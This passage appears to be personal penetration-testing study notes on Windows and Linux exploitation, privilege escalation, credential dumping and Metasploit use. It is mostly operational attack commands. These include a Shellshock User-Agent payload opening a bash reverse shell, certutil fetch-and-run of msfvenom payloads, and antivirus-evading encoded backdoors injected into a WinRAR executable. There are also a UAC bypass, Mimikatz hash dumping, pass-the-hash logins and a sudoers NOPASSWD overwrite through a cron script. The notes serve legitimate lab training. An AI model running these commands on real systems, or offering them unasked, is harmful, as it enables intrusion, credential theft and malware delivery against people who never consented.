It is an **RDP** vulnerability, attackers send specially crafted RDP requests, it causes buffer overflow, attacker manipulates kernel’s memory because of the exploit script and sends a payload, and he gets a **fully** privileged meterpreter session.

*******Can **crush** the system because of a kernel manipulation.

**Exploitation**:

- `cve_2019_0708_bluekeep` - scanner module in MSF, checks if a service is vulnerable to BlueKeep
- `cve_2019_0708_bluekeep_rce` - exploit for BlueKeep
    - `show targets` - choosing the vulnerable Windows machine
        - `set target <number>`
            
            

**—No Credentials Needeed—**

### Exploiting WinRM

**WinRM** is Windows Remote Management Protocol used for remote access to Windows hosts via HTTP(S), it is mostly used by system administrators for making life easier. Ports are 5985 (HTTP) & 5986 (HTTPS)

WinRM implements various forms of authentication for security reasons.

**Exploitation**:

- `crackmapexec winrm <target ip> -u administrator -p <passwords.txt>` - **brute**-forcing with **`crackmapexec`,** we can use other protocols as well (like ssh, ftp, mssql, etc)
- `crackmapexec winrm <target ip> -u administrator -p tinkerbell -x “whoami”` - comman executing
- `evil-winrm -u administrator -p tinkerbell -i <target ip>` - for a cmd session

For a meterpreter session in Metasploit

- `winrm_script_exec` in Metasploit
    - `set FORCE_VBS true`
    - setting username, password
    - `run`

## Windows Privilege Escalation

Privilege escalation is the process of exploiting (a part of post-exploitation) misconfigurations and vulnerabilities in a system to elevate privileges from one user to another user, typically a root or administrator. Privilege escalation is very important in the overall success of penetration testing.

### Escalation by Windows Kernels

Kernel is the core of an OS, that has a **complete** control over every resource of hardware and software, acts as a interpreter between hardware and software.

Windows Kernels are **Windows NT**, they have 2 main modes: User & Kernel.

1. **User** mode has only limited access to the available resources on Windows
2. **Kernel** mode has unrestricted access to those resources, with the added functionality of managing devices and memory. 

1. `sessions` - sessions (meterpreter, etc) in Metasploit (`sessions <number>` - for choosing)
    - `meterpreter > getprivs` - enables privileges for the current user
    - `meterpreter > getsystem` - automatically elevating **privileges**
    - `meterpreter > bg`
    - `search **local_exploit_suggester**` - enumerating exploits on a target host
        - `set session <number>` (setting the meterpreter session)
    - `use post/windows/…` (using any post-exploitation modules)
        - `set session <number>`
            - **`run`**
    
    **administrator** on Windows - NT AUTHORITY\SYSTEM (root on Linux)
    

1. Windows exploit suggester from **GitHub** - `python2 windows-exploit-suggester.py --update` (for getting a database file)
- `python2 windows-exploit-suggester.py --database <database.xls> --systeminfo <systeminfo.txt>`
    - systeminfo must be copied to a text file
    - it will give exploit names
- searching kernel exploits and their .**exe** files from SecWiki**/**windows-kernel-exploits
    - `meterpreter > cd C:\Temp` - for hiding exploits from users
    - `meterpreter > upload <exploit.exe>`
    - `meterpreter > .\<exploit.exe>`
        - the same session but as NT AUTHORITY

### Bypassing UAC with UACMe

UAC - User Access Control is a Windows security feature that is used to prevent Windows from unauthorized changes. 

UAC has variety of integrity levels from **low to high**.

1. If a **non-privileged** user tries to access a program that requires a privilege, he will face the **UAC credential prompt**:
    
    ![uac-credential-prompt.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/5b559fd1-44a9-48a9-ace5-96e04c706280/5d57032b-3487-4bb6-b9ef-85c9fae95780/uac-credential-prompt.png)
    
2. If a **privileged** user (**administrator** or a user who is a part of the **local** administrators group) tries to access an app that requires a privilege, then he will face a **consent prompt:**
    
    ![uac-consent-prompt-admin.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/5b559fd1-44a9-48a9-ace5-96e04c706280/dd7c1155-cf6d-4805-9d22-9f4d628443df/uac-consent-prompt-admin.png)
    

We can **bypass** UAC with having access to a user that is a part of the local administrators group. We will use **UACMe** from GitHub, it contains variuos methods for bypassing UAC, it abuses **AutoElevate** executables.

**Powershell** commands:

- `net user` - users in the system
- `net localgroup administrators` - members of the local administrators group

**Metasploit**: (Only exploitation not privilege escalation)

- `search rejetto` (HTTP file server exploitation) ***HFS 2.7 exploitation***
    - `set rhosts`
- `meterpreter > sysinfo`
- `meterpreter > pgrep explorer`
- `meterpreter > migrate <pid_explorer>` (for migrating x32 to x64 **meterpreter**)
- `meterpreter > getuid` (server username)

- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=1234 -f exe > backdoor.exe`
- `use multi/handler`
    - `set payload windows/meterpreter/reverse_tcp`
        - `set LHOST, LPORT`
            - `run`
- `meterpreter > cd C:\Temp`
- `meterpreter > upload backdoor.exe`
- `meterpreter > upload Akagi64.exe` (from UACMe in GitHub)
- `meterpreter > shell`
- `meterpreter > .\Akagi64.exe 23 C:\Temp\backdoor.exe` (it runs the payload with method 23) (`C:\Temp\backdoor.exe` it **must** be full directory)
    - Method 23:
        
        Author: Leo Davidson derivative
        
        ```
        Type: Dll Hijack
        Method: IFileOperation
        Target(s): **\\system32\\pkgmgr.exe**
        Component(s): DismCore.dll
        Implementation: ucmDismMethod
        Works from: Windows 7 (7600)
        Fixed in: unfixed 🙈
            How: -
        Code status: added in v2.5.1
        
        ```
        
- `meterpreter > getprivs` - this time we have more privileges
- `meterpreter > ps` - processes
- `meterpreter > migrate <number_of_lsass>` - we migrate to a process that has administrator privileges (NT AUTHORITY privileges)
    - Meterpreter with administrator privileges
    - `meterpreter > hashdump`
    - aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6 - green is hash

OR

- `meterpreter > getsystem`

***OVERALL***: if we find our username (`getuid`) in local administrators group (`net localgroup administrators`), then we can ***bypass*** UAC for privesc.

### Access Token Impersonation

Windows Access Tokens are created by **winlogon.exe** (Windows login process, we open up our computers) and managed by **LSASS** (Local Security Authority Subsystem Service). It is like web cookies, but these tokens are temporary, generated whenever a user authenticates successfully, it includes the identity and privileges of that user. Then, it is attached to **userinit**.exe for further operations by that user for running under specified privileges of that user.

There 2 **security** levels of Windows tokes:

1. Impersonate: they can be impersonated on the local system, not on external systems that utilize tokens.
2. Delegate: can be impersonated both on local systems and external ones

**Privileges** that are required to do the impersonation attack (1 of 3):

1. **SeAssignPrimaryToken**: allows a user to impersonate tokens
2. **SeCreateToken**: allows a user to create an arbitrary token with administrator privileges
3. **SeImpersonatePrivilege**: allows a user to create a process under the security context of another user typically with administrator privileges

In Meterpreter session, we have **Incognito** module for impersonating tokens if we have 1 of 3 privileges that was specified above.

- `meterpreter > load incognito`
- `meterpreter > list_tokens -u` (user tokens)
- `meterpreter > impersonate_token '<username>'`
- `meterpreter > pgrep explorer`
- `meterpreter > migrate <explorer_id>`
- ***doing this until we find the **administrator** account

## Windows File System Vulnerabilities (ADS)

**ADS** - Alternate Data Streams is a NTFS (New Technology File System - Windows file system) file attribute.

File attribute contains information about a file.

**ADS** has 2 streams/parts:

1. **Data** Stream - the actual data of a file
2. **Resource** Stream - the metadata of a file (owner, creation data, file size, etc)

Attacker can use ADS to **hide** payloads in the Resource Stream from detection

**Powershell** commands:

- `notepad test.txt` - creating a file
- `del test.txt` - removing a file
- `notepad test.txt:secret.txt` - hiding a file inside of a **resource stream of test.txt**
- `type payload.exe > legitimate.txt:winpeas.exe` - **copies** payload.exe into a new file (winpeas.exe), then **hides** it in legitimate.txt
- `del payload.exe` - deleting after copying into the resource stream of legitimate.txt
- `start legitimate.txt:winpeas.exe` - doesn’t work because there is no program for executing the file.
- `C:\Windows\system32> mklink windows_update.exe C:\Temp\legitimate.txt:winpeas.exe` - creates a link for execution, when we type `windows_update`, it executes `winpeas.exe`

## Windows Credential Dumping

### Windows Password Hashes

Stored in the **SAM** (Security Accounts Manager) database file. Cannot be copied. Encrypted with **syskey. C:\Windows\system32\config\SAM**

Hashing is the process of converting data into another format using hashing algorithms.

Windows uses 2 (old, new) algorithms:

1. **LM** (no longer used, after Vista) - LanMan:
    1. breaks into 2 chunks, converts to uppercase, uses DES (Data Encryption Standard)
2. **NTLM** - NTHash:
    1. no breaking, case sensitive, MD4 

**Unattended Windows Setup** (used for automation of installation, etc) uses configuration files that have user credentials if they are left on the target:

1. **`C:\Windows\Panther\Unattend.xml`**
2. **`C:\Windows\Panther\Autounattend.xml`** (they can be in base64)

**Note**: Administrator can change the password after all

Commands on **Linux**:

1. payload with `msfvenom` then: `python2 -m SimpleHTTPServer 80`

 3.  `use multi/handler, set payload <the_same>`

1. `meterpreter > download C:\Windows\Panther\unattend.xml`
2. `echo ‘<password>’ | base64 -d`
3. [`psexec.py](http://psexec.py) administrator@<ip>`, then the password from unattend.xml

**Powershell**:

- `whoami /priv` = `getprivs` in meterpreter
1. `certutil -urlcache -f http://<local_ip>/payload.exe payload.exe` - wget on Windows

 4.  `start payload.exe`

### Dumping Hashes with Mimikatz and Kiwi

**Mimikatz** is a post-exploitation tool for extarcting **passwords** and their **hashes** from the memory (lsass.exe).

Or we can use a meterpreter module (`meterpreter > load **kiwi**`) it is, actually, mimikatz

**NOTE**:For this we must access to **lsass**.exe

- `search badblue_passthru` - BadBlue 2.7 exploitation
- `meterpreter > pgrep lsass` *************
- `meterpreter > migrate <$lsass_id>`
- `meterpreter > load kiwi`
- `meterpreter > ?` -  help menu
- `meterpreter > creds_all` - the password hash of the current user
- `meterpreter > lsa_dump_sam` - NTLM hashes of **all** users
- `meterpreter > lsa_dump_secrets` - can give some clear-text passwords

- `meterpreter > mkdir Temp`
- `meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
- `meterpreter > shell`
- `.\mimikatz.exe`
- `mimikatz # privilege::debug` - for checking privileges for hash dumping
- `mimikatz # lsadump::sam`
- `mimikatz # lsadump::secrets`
- `mimikatz # sekurlsa::logonpasswords`

### Pass-The-Hash attacks

It is an **exploitation** technique to **gather** and **use** NTLM hashes for authentication.

With: `crackmapexec`, `exploit/windows/smb/psexec`, and `evil-winrm` in metasploit

- `meterpreter > **hashdump**` - gives LM and NTLM hashes of all users
    - aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6 - ***LM:NTLM***
- use `exploit/windows/smb/psexec`, `set RHOSTS, LHOST, SMBUser`
    - `set **SMBPass <LM:NTLM>` - we can set this as a hash as well**
    - `set SMBPass aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6`

OR

- `crackmapexec smb <ip> -u administrator -H '<NTLM_hash>'` - `crackmapexec smb <ip> -u administrator -H '4d6583ed4cef81c2f2ac3c88fc5f3da6'`
- `crackmapexec smb <ip> -u administrator -H '<NTLM_hash>' -x 'ifconfig'` - code execution with (`-x`)
- `crackmapexec smb <ip> -u administrator -H '<NTLM_hash>' -x 'net user administrator password123’` - changing the password
- `evil-winrm -u administrator -H <NTLM> -i <ip>` - if WinRM service is up, it gives a meterpreter session

## Exploiting Linux Services

Linux is an open-source OS, developed by Linus Torvalds, and GNU toolkit.

| Apache web server | 80/443/TCP | Open-source web server for Linux machines |
| --- | --- | --- |
| FTP (File Transfer Protocol) | 21/TCP | File transfering between server/client. Also used for web servers.  |
| SSH (Secure Shell) | 22/TCP | Remote access protocol (cryptographic) over an unsecured network. Successor to telnet |
| SAMBA | 445/TCP | Open-source implementation of SMB on Linux. Allows windows devices to access to Linux |

### Bash CVE-2014-6271 (Shellshock) Vulnerability

Shellshock is the general name of **Bash** vulnerabilities, that allow an attacker to execute **arbitrary** commands, whereby Bash mistankenly executes trailing **commands** after some characters.

Apache servers are configured to run **CGI** (Common Gateway Interface) or .sh scripts, they are also vulnerable to this attack. CGI scripts are (can be) written in Bash (python, perl, etc)

**CGI** is a server-side script, contrary to JavaScript.

- `nmap -p80 —script=http-shellshock —script-args=’http-shellshock.uri=<cgi_directory>’ <ip>` - checking the vulnerability
- Using Burpsuite: Send to Repeater
- Using Burpsuite: Deleting User-Agent info
- Using Burpsuite: User-Agent: () { :; }; echo; echo; /bin/bash -c ‘cat /etc/passwd’

- **`rlwrap** nc -nlvp 1234`
- Using Burpsuite: User-Agent: () { :; }; echo; echo; /bin/bash -c ‘bash -i>&/dev/tcp/<local_ip>/1234 0>&1’

OR

- `search apache_mod_cgi_bash_env_exec` - in Metasploit
- `set TARGETURI /gettime.cgi`

### Exploiting FTP

FTP can be used for transferring files to and from a directory web server. Default port (21/TCP) can be changed.

- `hydra`
- `ftp <ip>` - then entering username & password
- `dir`, `get <flag.txt>`
    
    
- `searchsploit proftpd 1.3.5`

### Exploiting SSH (default port can be changed)

SSH authentication can be performed in 2 ways:

1. username & password
2. key based authentication

- `hydra`

### Exploiting SAMBA

smbclient is a part of SAMBA software suite, used for interaction with SAMBA.

- `hydra`
- `smbmap -H <ip> -u <user> -p <password>` - gives share names
- `smbclient -L -U <user> <ip>` - lists share names as well
- `smbclient //ip/<share> -U <user>` - interacting with SAMBA
    - `smb: \> ?` - help
- `enum4linux -a <ip> -u <user> -p <password>`

## Linux PrivEsc

### Linux Kernel Exploits

- `meterpreter > shell`
- **`/bin/bash -i`** - for a bash shell
- `meterpreter > cd /tmp`
- `meterpreter > upload linux-exploit-suggester.sh`, then `chmod +x linux-exploit-suggester.sh`
- `search **suggester**` in `msfconsole`

### Cron Job exploitation

Task scheduling on Linux is done by time-based **Cron** utility.

Cron **Jobs** are scripts that are run time to time by Cron.

The configuration file is: `/etc/crontab`

If a cron job is run by the **root** user, and configured poorly (if we have an access to write them), then we can escalate our privileges.

- `crontab -l` - checking for cron jobs for the current user
    - ******* If we don’t find, it **doesn**’t mean that there is no cronjob file.
- **`grep** -rnw /usr -e ‘/home/user/<cronjob_file>’ 2>/dev/null` - shows **files (inside of /usr)** that contains the **path** - `/home/user/<cronjob_fle>`
- after finding a related script file like `/usr/local/share/copy.sh`, we see that it contains our cronjob_file.
    - if we have a write permission, we do:
    **`printf** “#!/bin/bash\necho ‘student ALL=(ALL) NOPASSWD:ALL’ >> /etc/sudoers\n” > /usr/local/share/copy.sh` - if there is no **`nano`**
- `sudo -l` - we can access everything without any password

### SUID binary exploitation

**SUID** (Set User ID) are special binaries, that are executed with the owner’s privileges. **PrivEsc** depends on the execution of a binary.

For PrivEsc:

1. SUID bits must be set by the **root** user.
2. We must have privileges to execute them.

- `file <file_suid>` - gives info about the file’s type
- `strings <file_suid>` - printable characters inside of a file, especially for **non-text** files
    - *** we don’t have permission to write <file_suid>, but we can execute it.
    - we see that the `<file_suid>` have `setuid` and another `<another_file>` inside of it.
- `mv <another_file> <random_name>`
- `cp /bin/bash <another_file>`
- `./<file_suid>` - the **<file_suid>** will run **/bin/bash** with root privileges, we’ll get the root privileges.

`find / -perm -4000 2>/dev/null` - for find binaries that have SUID bits

- `-perm` means permission
- `-4000`  - it is an octal value for SUID bits

### Linux Password Hashes

`/etc/passwd` - all users and info about them, accessible by everyone

`/etc/shadow` - the hashes of users, only accessible by the root user

$1 - MD5 (unsecure)

$2 - Blowfish (unsecure)

$5 - SHA-256 (moderate)

$6 - SHA-512 (moderate)

- `search proftpd` - use proftpd 1.3.3
    - `setg rhosts`
- CTRL + Z - background
- **`sessions -u 1`** - meterpreter session for the shell
- `use post/linux/gather/hashdump` - hashdumping linux
    - `set session <number>`
- `use auxiliary/analyze/crack_linux`
    - `set <algorithm> true` - set SHA512 true

Unshadowed hashes - ready to be cracked

# Network-based attacks (Host & Network Penetration Testing)

Network-based attacks deal with network **traffics** and **services**.

Some network services are: DHCP, ARP, FTP, SMB, SSH, telnet.

For analyzing traffics we use wireshark and tshark.

- `tshark -i eth0` - run on interface eth0
- `tshark -r packets.pcapng | wc -l` - read from and give the number of lines
- `tshark -r <packet.pcapng> -c 100` - read the first 100 lines
- `tshark -r <packet.pcan> -z io,phs -q` - for hierarchy
- `tshark -r <packet.pcapng> -Y “http”` - only HTTP protocol
- `tshark -r <.pcanpg> -Y ‘ip.src==<ip> && ip.dst==<ip>’`
- `tshark -r <packet.pcapng> -Y “http.request.method==GET” | more`
- `tshark -r <.pcap> -Y ‘http.request.method==GET’ -T fields -e frame.protocols | more` - print only frame protocols
- `tshark -r <.pcap> -Y ‘http contains password’` - ‘contains’ is a regex
- `tshark -r <.pcap> -Y ‘http.request.method==GET && http.host==www.nytimes.com’ -T fields -e ip.dst` - filter and print ip destinations
- `tshark -r <.pcapng> -Y ‘ip contains [amazon.com](http://amazon.com) && ip.src==<ip>’ -T fields -e ip.src -e http.cookie` - gives sesion ids as well
- `tshark -r <.pcap> -Y ‘ip.src==<ip> && http contains amazon.in’ -T fields -e  http.user_agent`
- `thsark -r <.pcap> -Y ‘ip.src==<ip>’ -T fields -e ip.ttl` - ttl value (if it is 64, then the OS is Linux/Mac)

### ARP Poisoning (man-in-the-middle)

`echo 1 > /proc/sys/net/ipv4/ip_forward` - enabling ip forwarding by writing 1

`arpspoof -i <interface> -t <target> -r <router_target>`

`arpspoof -i eth0 -t 10.10.1.2 -r 10.10.1.3`

In a typical ARP spoofing attack:

1. **Attacker** sends falsified ARP messages to both the victim and the gateway.
2. **Victim** (e.g., a computer on the network) believes the attacker’s MAC address is the MAC address of the gateway.
3. **Gateway** (e.g., a router) believes the attacker’s MAC address is the MAC address of the victim.
4. **Traffic** that was supposed to go directly between the victim and the gateway is now routed through the attacker.

# The Metasploit Framework ( Host & Net)

The metasploit framework is an open-source, robust penetration testing framework. It automates every stage of penetration testing life cycle, and developers constantly add new exploits.

Terminology:

- Interface - methods for interacting with the framwork
- Module - a piece of code for performing a particular **task** (scanning, exploiting)
- Exploit - code that takes advantage of a vulnerability
- Payload - code that is delivered by an **exploit** for providing an attacker with a remote access
    - **Non-staged payload:** a payload that is sent to a target as a whole alongside an exploit.
    - **Staged payload:** a payload that is sent to a target in 2 parts:
        - Stager (1st part): establishes a reverse connection between a target and an attacker
        - Stage (2nd part): the payload that is executed
- Listener - listens for an incoming connection from a target

`/usr/share/metasploit-framework/modules` - modules in a file explorer

`~/.msf4/modules` - user specific modules

**Meterpreter** (Meta-Interpreter) payload is an **advanced** payload that is executed only in the memory, makes it diffcult to detect. It has some features like keylogging, file system navigation, system commands, and much more.

**Post-exploitation** includes:

1. Local Enumeration
2. Privilege Escalation
3. Dumping Hashes
4. Pivoting
5. Maintaining persistent access
6. Clearing tracks

### Initialzing the MSF

`sudo systemctl enable postgresql && sudo systemctl start postgresql`

`sudo msfdb init`

***`sudo msfdb reinit` - the second choice if we have errors

`msfdb` - for commands

`msfdb status`

 

## Using the MSF (Fundamentals and Enumeration)

### **Fundamentals**

`msf6 > ?` - help

`msf6 > show auxiliary` - auxiliary modules only

`msf6 > show -h` - help menu for the command ‘show’

`msf6 > search portscan` - port scanning modules

`msf6 > use auxiliary/scanner/portscan/tcp` or `use 5` - using modules

`msf6 auxiliary(scanner/portscan/tcp) > show options` or `options` - for options

`msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS <target>`

`msf6 auxiliary(scanner/portscan/tcp) > setg RHOSTS <target>` - a global variable (the value isn’t changed in different modules)

`msf6 auxiliary(scanner/portscan/tcp) > run` or `exploit` - for running the module or an exploit

`msf6 auxiliary(scanner/portscan/tcp) > back` - for exiting from the current module

`msf6 > search cve:2017 type:exploit platform:windows` - windows exploit modules that have the cve-2017

`msf6 > sessions` - for active session (meterpreter)

`msf6 > connect <ip> <port>` - tcp connection (like netcat)

### **Workspaces** allow you to track of all your hosts, scans, activities, etc.

`msf6 > workspace` - listing

`msf6 > hosts` - saved LHOSTs

`msf6 > workspace -a <name>` - adding a new workspace

`msf6 > workspace INE` - chaning the current workspace to INE

`msf6 > workspace -d <name>` - deleting a workspace

`msf6 > workspace -r <old_name> <new_name>` - renaming a workspace

### **Importing**

`nmap -sV -O -**oX** results.xml <ip>` - output as an XML file

`msf6 > workspace -a nmap_1` - a new workspace

`msf6 > db_import /home/user/results.xml`

`msf6 > hosts` - for the target <ip>

`msf6 > services` - info about the services

`msf6 > workspace -a nmap_2`

`msf6 > **db_nmap** -sV -O <ip>` - no need to output the results this time

`msf6 > hosts`

`msf6 > vulns`-  for vulnerabilities in services

### **Port scanning with the MSF**

We do port scanning with the MSF mostly because of **post-exploitation** when we gain initial access. We will have another **subnet**, but it is going to be availabe on the the target machine for port scanning (our host cannot scan because we are not part of the subnet). - ***Pivoting***

- `msf6 > search portscan`
- `msf6 > use auxiliary/scanner/portscan/tcp`
- `msf6 > set RHOSTS <ip>`
- `msf6 > set PORTS 1-65535` - for all ports
- `msf6 > run`
- `msf6 > curl <ip>` - web server HTTP code (MSF allows us to interact with Linux commands)

- `msf6 > search xoda` - for exploiting the **web** server
- `msf6 > use xoda`
- `msf6 > set RHOSTS <ip>`
- `msf6 > set TARGETURI /`
- `msf6 > run`
- `meterpreter > shell`
- `ifconfig`
    - **Getting the subnet of another target**
- **`meterpreter > run autoroute -s <subnet>`** - allows all MSF modules to get **access** to the subnet (second_ip)
- `meterpreter > bg` - background
- `msf6 > use auxiliary/scanner/portscan/tcp`
- `msf6 > set RHOSTS <new_ip>`
- `msf6 > run`

Optional:

- `msf6 > search udp_sweep` - UDP port scanning

### FTP

- `msf6 > search name:ftp type:auxiliary`
- `msf6 > use auxiliary/scanner/ftp/ftp_version`
- `msf6 > search <ftp_version>` - for exploitation

- `msf6 > use auxiliary/scanner/ftp/ftp_login` - FTP **brute** forcing

- `msf6 > use auxiliary/scanner/ftp/anonymous` - **anon** login scanner

### SMB

- `msf6 > search name:smb type:auxiliary`
- `msf6 > use auxiliary/scanner/smb/smb_version`
- `msf6 > use auxiliary/scanner/smb/smb_enumusers`
- `msf6 > use auxiliary/scanner/smb/smb_enumshares`
    - `msf6 > set ShowFiles true`
- `msf6 > use auxiliary/scanner/smb/smb_login`
    - `msf6 > set SMBUser admin`
    - `msf6 > set PASS_FILE <file>`
- `smbclient -L -U admin <ip>` - listing shares
- `smbclient //<ip>/<share> -U admin`

### Web Server Enum

Web server is used to serve website data.

- `msf6 > search name:http type:auxiliary`
- `msf6 > use auxiliary/scanner/http/http_version`
- `msf6 > use auxiliary/scanner/http/http_header` - content-type, server type, etc.
- `msf6 > use auxiliary/scanner/http/robots_txt`
- `msf6 > use auxiliary/scanner/http/dir_scanner` - directory fuzzing
- `msf6 > use auxiliary/scanner/http/files_dir` - file fuzzing (not directory)
- `msf6 > use auxiliary/scanner/http/http_login` - HTTP brute-forcing
    - `set AUTH_URI /webdav`
    - `unsetg USERPASS_FILE`
- `msf6 > use auxiliary/scanner/http/apache_userdir_enum`
- `msf6 > use auxiliary/scanner/http/options` - gives headers (GET, POST, etc)
- `msf6 > use auxiliary/scanner/http/**http_put**` - uploading file (if we have POST a header)
    - `msf6 > set PATH /<path>` - path for uploading

### MySQL DBMS

Used for storing web data. (more likely)

- `msf6 > search type:auxiliary name:mysql`
- `msf6 > use auxiliary/scanner/mysql/mysql_version`
- `msf6 > use mysql_login` - mysql brute
- `msf6 > use mysql_enum` - requires credentials, gives databases
- `msf6 > use mysql_sql` - running queries, credentials required
- `msf6 > use mysql_schemadump` - gives databases and tables
- `msf6 > hosts`, `services`, `vulns`, `creds`, `loot`

### SSH

- `msf6 > search type:auxiliary name:ssh`
- `msf6 > use ssh_version`
- `msf6 > use ssh_login` - credential brute-forcing
    - `msf6 > sessions` - this module gives us a session
- `msf6 > use ssh_login_pubkey` - key based brute-forcing
- `msf6 > use ssh_enumusers`

### SMTP (Simple Mail Transfer Protocol)

SMTP is used e-mail transmission. 25 is the default port. If it has a TLS (more modern than SSL) certificate, then it can be **465** or **587**.

- `msf6 > search type:auxiliary name:smtp`
- `msf6 > use smtp_version`
- `msf6 > use smtp_enum` - user enumeration, can be used in **ssh**

## Vulnerability scanning

- `msf6 > db_nmap -sS -A -p- <ip>`
- `msf6 > search type:exploit name:glassfish`
- `msf6 > use glassfish_deployer`
- `msf6 > info`
- `searchsploit ‘Windows SMB’ | grep Metasploit` - gives Metasploit exploit modules for SMB

- `msf6 > load **db_autopwn**` - From GitHub
- `msf6 > db_autopwn -p -t -PI 21` - ftp matching exploit modules (based on `msf6 > services` command)
- `msf6 > analyze`

### Nesus

after scanning → export → nessus

- `msf6 > workspace -a nessus` - optional
- `msf6 > db_import <file.nessus>`
- `msf6 > services` - for ports and their service versions
- `msf6 > vulns -p 21` - FTP vulnerabilitites

### Web App Vulnerability Scanning with WMAP

- `msf6 > load wmap`
- `msf6 > wmap_sites -a <ip>` - adding our target to our `msf6 > services`
- `msf6 > wmap_targets -t http://<ip>/` - defining target websites
- `msf6 > wmap_run -t` - shows all useful modules for enumeration (only modules)
- `msf6 > wmap_run -e` - does actual scan (execution of modules)
- `msf6 > wmap_vulns -l` - found vulnerabilities

## Msfvenom (Payload generator)

**Client-side** attacks are forcing victims to execute a malicious payload. Social engineering is included.

Service & host based attacks are about exploiting services and inherent vulnerabilitites, but client-side attacks are about executing malicious payloads on target hosts.

Msfvenom is used for generating payloads, and it is a combination of 2 tools. Msfpayload and Msfencode - Msfvenom, then it connects back to our handler or listener.

- windows/x64/meterpreter/reverse_tcp - Staged paylaod
- windows/x64/meterpreter_reverse_tcp - Non-staged payload

OR
I am wrong?

- `msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<local.ip> LPORT=<local.port> -f exe -o shell.exe` - 32 bit payload (not 86) (-a = architecture)
- `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<local.ip> LPORT=<local.port> -f elf -o shell.elf` - 64 bit linux payload
- .elf means Executable and Linkable Format - Linux payload extension
- `msf6 > use multi/handler` or `python -m http.server 80`
    - `set payload <the_same_one>`
    - `set LPORT <same>`
    - `set LHOST <same>`
- RUNning the payload

*******`windows/meterpreter/reverse_tcp` - by default it is x86 (so 32 bit)

### Encoding

Encoding is used for hiding our payloads or shellcode from AV (antivirus) detection. AV solutions use signature based detection (they have a database of malicious code signatures, and they compare it)

- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local.ip> LPORT=<local.port> -e x86/shikata_ga_nai -i 10 -o shell.exe` - 32 bit windows payload with a 32 bit encoder, **iterated** 10 times (encoded 10 times again and again, one after one)

### Injecting

- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 10 -x wrar.exe -k -f exe -o winrar.exe` - generates a payload, encodes it for 10 times, `-x` then injects it inside of a winrar (wrar.exe) executable, `-k` keeps the same functionality of the executable (when you click it, it behaves like real winrar, but can give errors), saves as winrar.exe.
- `meterpreter > run post/windows/manage/migrate` - migrating to another process for not being terminated in the future or switching from x86 to x64

### Resource Scripts for automation

`/usr/share/metasploit-framwork/scripts/resource` - path for sample scripts

Creating for ourselves:

- `nano handler.rc`
    - `use multi/handler`
    - `set payload ….`
    - `set lhost ….`
    - `set lport ….`
    - `run`
- `msfconsole -r handler.rc` - automatically starts to set up a handler

OR

- `msfconsole -q`
- `msf6 > resource handler.rc`

Setting inside of MSF:

- `msf6 > use auxiliary/scanner/portscan/tcp`
- `msf6 > set rhosts …`
- `msf6 > run`
- `^C`
- `msf6 > makerc ~/Documents/portscan.rc`

## Exploitation

### Windows

### HFS

HFS is an HTTP File Server used for file sharing.

Rejetto HFS is a popular web server for sharing files, and Rejetto v2.3 is vulnerable to **RCE**.

- `msf6 > use rejetto_hfs_exec`

### EternalBlue

Vulnerability in SMBv1, takes advantage of buffer overflow, then a payload is executed for **RCE**

- `msf6 > use smb_ms17_010` - for checking
- `msf6 > use ms17_010_eternalblue` - for exploitation (this module also checks)

### WinRM

WinRM (Windows Remote Management) tool is used for facilitating remote access with Windows hosts, uses credentials for authentication. (5985/5986/TCP (HTTPS)) 

- `msf6 > use winrm_auth_methods` - checking if there is a winrm service
- `msf6 > use winrm_login` - brute-forcing credentials (`crackmapexec` can also be used)
- `msf6 > use winrm_cmd` - winrm command runner
- `msf6 > use winrm_script_exec` - for meterpreter shell (`evil-winrm` can also be used)
    - `msf6 > set FORCE_VBS true`
    

### Apache Tomcat

**Standard** Apache server runs on port 80 or 443, but Apache **Tomcat** serves on port 8080.

Standart Apache is developed in PHP, but Apache Tomcat in Java.

Versions under 9 are vulnerable to **JSP** (JavaServer Pages) payload, especially v8.5.19

- `msf6 > use tomcat_upload_jsp_bypass`
    - `msf6 > set payload java/jsp_shell_bind_tcp`
    - `msf6 > set shell cmd`
    - `msf6 > run` - doesn’t give a meterpreter session
    - `C:\>`
    
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<> LPORT=<> -f exe -o shell.exe`
    - `python -m http.server 80`
    - `C:\> certutil -urlcache -f http://local.ip>/shell.exe shell.exe` - on a target
    - `msf6 > use multi/handler` - on the local host
        - …
    - `C:\ .\shell.exe`
    - `meterpreter >`
    

### Linux

### FTP

vsftpd is a FTP server for Unix like OSs. vsftpd v2.3.4 is vulnerable to a malicious **backdoor** that was added to the download archive of vsftpd through a supply chain attack.

- `msf6 > use vsftpd_234_backdoor`
- CTRL + Z
- `msf6 > sessions -u 1` - for a meterpreter session

OR

- `msf6 > use shell_to_meterpreter`
    - `set LHOST …`
    - `set SESSION 1`

### SAMBA

Samba v3.5.0 is vulnerable to **RCE** when an attacker uploads a shared library, and the server executes it.

- `msf6 > use samba/is_known_pipename`
    - `check` - for checking if a target is vulnerable
- `msf6 > use shell_to_meterpreter`
    - `set lhost …`
    - `set session 1`

### SSH

libssh is SSH library written in C, **libssh** v0.6.0 to 0.8.0 is vulnerable to authentication **bypass** vulnerability in the libssh server code.

- `msf6 > use libssh_auth_bypass`
    - `msf6 > set SPAWN_PTY true`
    - `msf6 > sessions 1`
- `msf6 > use shell_to_meterpreter`
    - `set lhost …`
    - `set session 1`

### SMTP

SMTP (25/TCP or 465/587/TCP)

Haraka is a high performance SMTP server. Haraka versions prior (before) to v2.8.9 are vulnerable to a **command** **injection**.

- `msf6 > use smtp/haraka`
    - `set email_to <someone>@<domain.com>`
    - `set payload linux/x64/meterpreter/reverse_tcp`

## Meterpreter

Works differently on both OSs (windows, linux). On windows meterpreter has more features.

